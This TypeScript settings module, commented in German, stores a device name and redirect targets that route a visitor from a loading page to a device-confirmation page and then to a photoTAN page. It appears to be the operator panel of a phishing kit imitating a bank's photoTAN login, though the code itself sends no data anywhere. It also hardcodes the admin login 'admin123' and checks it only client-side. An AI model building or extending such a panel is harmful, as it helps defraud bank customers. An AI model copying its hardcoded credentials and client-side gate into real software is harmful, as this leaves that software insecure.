// Admin-konfigurierbare Einstellungen (LocalStorage)

export type AdminSettings = {
  deviceName: string; // 2 Buchstaben für DeviceConfirm-Seite
  redirects: {
    afterLoading: string;   // wohin nach /loading
    afterConfirm: string;   // wohin nach photoTAN-Klick auf /confirm
  };
};

const STORAGE_KEY = "admin_settings_v1";

export const DEFAULT_SETTINGS: AdminSettings = {
  deviceName: "EK",
  redirects: {
    afterLoading: "/confirm",
    afterConfirm: "/phototan",
  },
};

export function getSettings(): AdminSettings {
  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    if (!raw) return DEFAULT_SETTINGS;
    const parsed = JSON.parse(raw);
    return {
      ...DEFAULT_SETTINGS,
      ...parsed,
      redirects: { ...DEFAULT_SETTINGS.redirects, ...(parsed.redirects ?? {}) },
    };
  } catch {
    return DEFAULT_SETTINGS;
  }
}

export function saveSettings(s: AdminSettings) {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(s));
  window.dispatchEvent(new CustomEvent("admin-settings-changed"));
}

// Sehr einfaches Passwort-Gate (nicht für sensible Daten)
const AUTH_KEY = "admin_auth_v1";
const ADMIN_USERNAME = "admin@admin.de";
const ADMIN_PASSWORD = "admin123"; // bei Bedarf hier ändern

export function isAuthed(): boolean {
  return sessionStorage.getItem(AUTH_KEY) === "1";
}
export function login(username: string, pw: string): boolean {
  if (username === ADMIN_USERNAME && pw === ADMIN_PASSWORD) {
    sessionStorage.setItem(AUTH_KEY, "1");
    return true;
  }
  return false;
}
export function logout() {
  sessionStorage.removeItem(AUTH_KEY);
}
